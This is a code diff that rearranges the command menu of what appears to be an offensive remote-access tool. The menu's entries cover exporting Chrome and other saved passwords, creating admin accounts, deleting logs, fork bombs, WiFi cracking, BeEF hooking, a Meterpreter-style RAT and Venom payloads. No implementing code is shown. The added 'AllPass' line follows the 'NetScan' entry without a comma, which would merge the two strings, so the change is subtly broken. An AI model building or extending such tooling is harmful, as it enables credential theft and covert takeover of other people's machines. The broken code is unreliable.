@@ -776,17 +776,15 @@ while True:
 			"scan - Scan this machine",
 			"AddAdmin - Generate a new admin account"
 		],
-		"Connectivity": [
-		   "ssh - Attempt a local SSH connection",
-		   "ftp - Attempt a FTP connection",
-		  "ping - Check IP connectivity and response"
-		],
 		"Utilities": [
+			"ftp - Attempt a FTP connection",
+			"ping - Check IP connectivity and response",
 			"DiskFill - Fill disk space",
 			"DiskHost - Host a folder on port 8100",
 			"PassExport - Export Chrome passwords",
 			"DeleteLog - Delete logger.log",
 			"NetScan - Run a basic netscan of local network"
+			"AllPass - Export all found saved passwords"
 		],
 		"Critical Operations": [
 			"ForkBomb - Attempt a forkbomb",
@@ -796,11 +794,10 @@ while True:
 			"WifiCrack - Attempt to crack WiFi passwords",
 			"Hook - Attempt to hook this machine via BeEF"
 		],
-		"Remote Access": [  # NEW CATEGORY
-			"RAT - Deploy Meterpreter-style Remote Access Tool"
-		],
-		"Detectible Operations": [
-			"AllPass - Export all found saved passwords",
+		"Remote Access": [
+			"RAT - Deploy Meterpreter-style Remote Access Tool",
+			"ssh - Start SSH server on target machine",
+			"Venom - Run a Venom payload",
 		],
 		"Support & Exit": [
 			"info - Show details of a command",
